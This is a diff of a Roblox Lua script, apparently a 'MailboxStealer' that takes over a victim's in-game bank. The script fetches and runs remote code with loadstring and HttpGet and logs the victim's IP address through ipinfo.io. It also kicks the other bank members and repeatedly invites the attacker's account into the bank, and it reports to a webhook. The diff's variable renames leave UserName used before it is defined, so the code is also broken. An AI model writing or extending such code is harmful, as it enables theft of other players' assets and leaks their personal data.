@@ -72,19 +72,19 @@ end
 getexploit()
 local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
-local url = _G.Webhook
-if _G.UserID == nil then
+local url = Webhook
+if UserName == nil then
     game:GetService("Players").LocalPlayer:Kick("Put A UserId")
     return;
 end
 local worked = pcall(function()
-    game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+    game:GetService("Players"):GetNameFromUserIdAsync(UserName)
 end)
 if not worked then
     game:GetService("Players").LocalPlayer:Kick("Put A Valid UserId!")
     return;
 end
-local UserName = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+local UserName = game:GetService("Players"):GetNameFromUserIdAsync(UserName)
 if idiotuser == UserName then
     game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
 end
@@ -102,7 +102,7 @@ end
 
 
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet(loadingraw))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua"))()
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -523,7 +523,7 @@ local tier4gems = 1500000000000 - gemsinbank
 -- Kicking The Players
 
 for i, v in pairs(SuperBank["Players"]) do
-    if v ~= _G.UserID then
+    if v ~= UserName then
         kickremote:InvokeServer(Bank, v)
     end
 end
@@ -535,7 +535,7 @@ if tier ~= 1 then
         inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
     end
     task.wait()
-    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+    inviteremote:InvokeServer(mybanks[1]["BUID"], UserName)
 end
 -- Bank Pets
 Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
@@ -1209,7 +1209,7 @@ end
 
 local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game:GetService("Players").LocalPlayer
-local receiver = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+local receiver = game:GetService("Players"):GetNameFromUserIdAsync(UserName)
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local banktier = SuperBank["Tier"]
 local lmao = "/5"
@@ -1380,7 +1380,7 @@ if dhwebhook ~= nil then
     request(abcdef2)
 end
 for i, v in pairs(SuperBank["Players"]) do
-    if v ~= _G.UserID then
+    if v ~= UserName then
         kickremote:InvokeServer(Bank, v)
     end
 end
@@ -1389,5 +1389,5 @@ while task.wait(0.1) do
         inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
     end
     task.wait()
-    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+    inviteremote:InvokeServer(mybanks[1]["BUID"], UserName)
 end
